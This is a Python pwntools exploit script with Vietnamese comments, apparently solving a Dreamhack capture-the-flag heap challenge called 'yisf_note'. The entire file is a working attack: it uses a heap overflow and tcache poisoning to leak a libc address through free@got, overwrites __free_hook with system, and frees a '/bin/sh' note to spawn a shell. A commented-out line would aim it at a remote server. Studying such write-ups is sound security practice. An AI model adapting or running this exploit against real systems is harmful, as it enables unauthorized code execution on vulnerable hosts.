#!/usr/bin/env python3
from pwn import *

# --- Cấu hình ---
# Đặt kiến trúc và hệ điều hành
context.arch = 'amd64'
context.os = 'linux'

# Tên file binary và libc
# !!! QUAN TRỌNG: Bạn cần có file libc đúng của server remote !!!
# Nếu chạy local, hãy trỏ đến file libc trên máy của bạn.
ELF_NAME = './yisf_note'
LIBC_NAME = './libc.so.6' # Ví dụ: libc của Ubuntu 20.04

# Tạo đối tượng ELF và Libc để phân tích
elf = context.binary = ELF(ELF_NAME)
libc = ELF(LIBC_NAME)

# --- Hàm tương tác với chương trình ---
# Các hàm này giúp code exploit chính dễ đọc hơn

def send_command(p, cmd, size, data):
    """Gửi một command hoàn chỉnh tới server."""
    p.sendafter(b'please send the command\n', str(size).encode().ljust(5, b'\x00'))
    p.send(cmd + data)

def write(p, index, title, content_size, content):
    """Hàm tạo một note mới."""
    log.info(f"Tạo note {index} - size: {hex(content_size)}")
    # Dữ liệu: title (10 bytes) + size (4 bytes) + content
    data = title.ljust(10, b'\x00')
    data += p32(content_size)
    data += content
    send_command(p, b'W', len(data), data)

def modify(p, index, new_size, new_content):
    """Hàm sửa đổi một note."""
    log.info(f"Sửa note {index} - size mới: {hex(new_size)}")
    # Dữ liệu: index (2 bytes) + size (2 bytes) + content
    data = p16(index)
    data += p16(new_size)
    data += new_content
    send_command(p, b'M', len(data), data)

def delete(p, index):
    """Hàm xóa một note."""
    log.info(f"Xóa note {index}")
    data = p16(index)
    send_command(p, b'D', len(data), data)

def read(p, index):
    """Hàm đọc một note."""
    log.info(f"Đọc note {index}")
    data = p16(index)
    send_command(p, b'R', len(data), data)
    # Đọc và trả về output
    p.recvuntil(b'detail : ')
    return p.recvline().strip()

# --- Logic Khai thác ---
def exploit():
    # Kết nối tới process (local hoặc remote)
    p = process(elf.path)
    # p = remote('host3.dreamhack.games', 10333) # Thay đổi host và port nếu cần

    # Bỏ qua phần nhập tên ban đầu
    p.sendafter(b'Write your name : ', b'dreamhack\n')

    # --- Giai đoạn 1: Rò rỉ địa chỉ Libc (Libc Leak) ---
    log.info("--- Bắt đầu giai đoạn 1: Leak địa chỉ Libc ---")

    # 1. Sắp xếp heap để chuẩn bị cho Tcache Poisoning
    #    - chunk 0: Dùng để overflow
    #    - chunk 1 (A) và 2 (B): Các victim chunk sẽ được giải phóng
    #    - chunk 3: Guard chunk để ngăn consolidate với top chunk
    write(p, 0, b'overflow', 0x28, b'A'*0x28)
    write(p, 1, b'victim_A', 0x98, b'A'*0x98)
    write(p, 2, b'victim_B', 0x98, b'B'*0x98)
    write(p, 3, b'guard',    0x28, b'C'*0x28)

    # 2. Giải phóng chunk 2 và 1 để đưa chúng vào tcache bin (size 0xa0)
    #    Thứ tự giải phóng rất quan trọng. Tcache là LIFO (Last-In, First-Out).
    #    Sau khi free, tcache list sẽ là: [HEAD] -> chunk 1 -> chunk 2 -> NULL
    delete(p, 2)
    delete(p, 1)

    # 3. Thực hiện Heap Overflow (Tcache Poisoning)
    #    - Ghi đè vào chunk 0. Vì bug cho phép ghi đúng bằng size cũ,
    #      chúng ta có thể ghi tràn vào metadata của chunk 1 (đang free).
    #    - Ghi đè con trỏ `fd` (forward pointer) của chunk 1 để nó trỏ đến GOT của hàm free.
    log.info("Thực hiện Tcache Poisoning để leak...")
    payload = b''
    payload += b'A' * 0x28             # Padding để lấp đầy chunk 0
    payload += p64(0)                  # Fake prev_size của chunk 1
    payload += p64(0xa1)               # Fake size của chunk 1 (giữ nguyên size và cờ PREV_INUSE)
    payload += p64(elf.got.free)       # Ghi đè fd -> trỏ đến free@got
    
    # Kích thước payload phải bằng size của chunk 0 để bug hoạt động
    modify(p, 0, 0x28, payload)

    # 4. Lấy lại các chunk đã bị poison
    #    - Lần `write` đầu tiên sẽ trả về chunk 1 (bình thường).
    #    - Lần `write` thứ hai, malloc sẽ đi theo con trỏ `fd` đã bị sửa đổi
    #      và trả về một "chunk" tại địa chỉ free@got.
    write(p, 4, b'dummy', 0x98, b'D'*0x98)
    write(p, 5, b'read_got', 0x98, b'E'*0x98) # Note 5 giờ có content_ptr trỏ đến free@got

    # 5. Đọc note 5 để lấy địa chỉ của hàm free trong libc
    leaked_free_addr = u64(read(p, 5).ljust(8, b'\x00'))
    log.success(f"Địa chỉ free@libc bị rò rỉ: {hex(leaked_free_addr)}")

    # 6. Tính toán các địa chỉ cần thiết
    libc.address = leaked_free_addr - libc.symbols.free
    system_addr = libc.symbols.system
    free_hook_addr = libc.symbols.__free_hook
    log.success(f"Địa chỉ base của Libc: {hex(libc.address)}")
    log.success(f"Địa chỉ hàm system: {hex(system_addr)}")
    log.success(f"Địa chỉ __free_hook: {hex(free_hook_addr)}")

    # --- Giai đoạn 2: Ghi đè __free_hook và lấy Shell ---
    log.info("--- Bắt đầu giai đoạn 2: Ghi đè __free_hook ---")

    # 1. Sắp xếp lại heap cho lần poison thứ hai
    write(p, 6, b'overflow2', 0x38, b'F'*0x38)
    write(p, 7, b'victim_C', 0x48, b'G'*0x48)
    write(p, 8, b'victim_D', 0x48, b'H'*0x48)

    # 2. Giải phóng chunk 8 và 7 để đưa vào tcache bin (size 0x50)
    #    Tcache list: [HEAD] -> chunk 7 -> chunk 8 -> NULL
    delete(p, 8)
    delete(p, 7)

    # 3. Thực hiện Tcache Poisoning lần thứ hai
    #    - Ghi đè con trỏ `fd` của chunk 7 để nó trỏ đến __free_hook.
    payload2 = b''
    payload2 += b'I' * 0x38
    payload2 += p64(0)
    payload2 += p64(0x51)
    payload2 += p64(free_hook_addr) # Ghi đè fd -> trỏ đến __free_hook

    modify(p, 6, 0x38, payload2)

    # 4. Lấy lại chunk và ghi đè __free_hook
    #    - Lần `write` đầu tiên trả về chunk 7.
    #    - Lần `write` thứ hai sẽ cấp phát một chunk tại __free_hook
    #      và chúng ta sẽ ghi trực tiếp địa chỉ của `system` vào đó.
    write(p, 9, b'dummy2', 0x48, b'J'*0x48)
    write(p, 10, b'write_hook', 0x48, p64(system_addr)) # Ghi system_addr vào __free_hook

    # 5. Kích hoạt shell
    #    - Tạo một note có nội dung là "/bin/sh"
    #    - Giải phóng note đó. Lệnh free("/bin/sh") sẽ được gọi.
    #    - Vì __free_hook đã trỏ đến system, nên system("/bin/sh") sẽ được thực thi.
    log.info("Kích hoạt shell...")
    write(p, 11, b'/bin/sh\x00', 0x18, b'/bin/sh\x00')
    delete(p, 11)

    # Chuyển sang chế độ tương tác để sử dụng shell
    p.interactive()

if __name__ == "__main__":
    exploit()